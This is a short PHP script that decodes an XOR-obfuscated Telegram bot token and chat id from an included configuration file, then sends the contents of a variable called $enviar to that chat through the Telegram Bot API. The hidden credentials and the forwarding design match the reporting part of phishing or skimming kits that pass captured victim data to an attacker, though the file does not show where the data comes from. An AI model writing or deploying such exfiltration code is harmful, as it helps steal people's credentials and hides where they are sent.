<?php
include 'configure.php';
function xorDecrypt($encryptedText, $key) {
    $text = base64_decode($encryptedText);
    $result = '';
    for ($i = 0; $i < strlen($text); $i++) {
        $result .= chr(ord($text[$i]) ^ ord($key[$i % strlen($key)]));
    }
    return $result;
}
$bottoken = xorDecrypt($bottoken, $xorKey);
$chatid = xorDecrypt($chatid, $xorKey);
function enviar_telegram($enviar, $bottoken, $chatid) {
    $queryArray = [
        'chat_id' => $chatid,
        'text' => $enviar
    ];
    $result = file_get_contents("https://api.telegram.org/bot" . $bottoken . "/sendMessage?" . http_build_query($queryArray) . "&parse_mode=html");
}
enviar_telegram($enviar, $bottoken, $chatid);
?>